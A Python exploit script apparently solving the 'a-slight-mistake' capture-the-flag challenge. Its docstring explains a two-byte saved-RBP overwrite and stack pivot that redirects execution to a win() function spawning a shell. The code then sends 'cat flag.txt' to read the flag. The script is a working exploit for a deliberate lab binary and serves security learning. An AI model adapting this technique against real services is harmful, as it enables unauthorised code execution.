#!/usr/bin/env python3
"""
a-slight-mistake — AlpacaHack Daily 2026-07-11

greet(): char name[64] at rbp-0x40; read(0, name, 66) overflows exactly 2 bytes
into the saved RBP (stored at name[64]). main leaks &alpaca (= main_rbp-0x10).

Frames: greet_rbp = main_rbp-0x20, name = greet_rbp-0x40 = main_rbp-0x60.
So name[0] = leaked-0x50, saved RBP (name[64]) originally = main_rbp.

Overwrite the low 2 bytes of saved RBP to leaked-0x58. After greet returns,
main's `leave; ret` does rsp=rbp'(=leaked-0x58); pop rbp; ret → rip=[rbp'+8]=
name[0]. Put &win there → shell. (win() execve("/bin/sh").)

Usage: python3 solve.py <host> <port>
"""
import socket, sys, re, struct, time

HOST, PORT = sys.argv[1], int(sys.argv[2])
WIN = 0x4011b6

s = socket.create_connection((HOST, PORT), timeout=20); s.settimeout(5)
buf = b""
# read leak line
while b"alpaca`:" not in buf:
    buf += s.recv(4096)
leaked = int(re.search(rb"address of `alpaca`: (0x[0-9a-f]+)", buf).group(1), 16)
# wait for "your name> "
while b"your name>" not in buf:
    buf += s.recv(4096)

rbp_target = leaked - 0x58           # so rbp_target+8 == name[0] == leaked-0x50
payload = struct.pack("<Q", WIN)     # name[0..7] = &win
payload += b"A" * 56                 # name[8..63]
payload += struct.pack("<H", rbp_target & 0xffff)  # name[64..65] = low 2 bytes of saved RBP
assert len(payload) == 66
s.sendall(payload)
time.sleep(0.3)
s.sendall(b"cat flag.txt\n")
time.sleep(0.5)
out = b""
try:
    while True:
        d = s.recv(4096)
        if not d: break
        out += d
except Exception:
    pass
s.close()
m = re.search(rb"Alpaca\{[^}]*\}", out)
print(m.group(0).decode() if m else out.decode(errors="replace"))
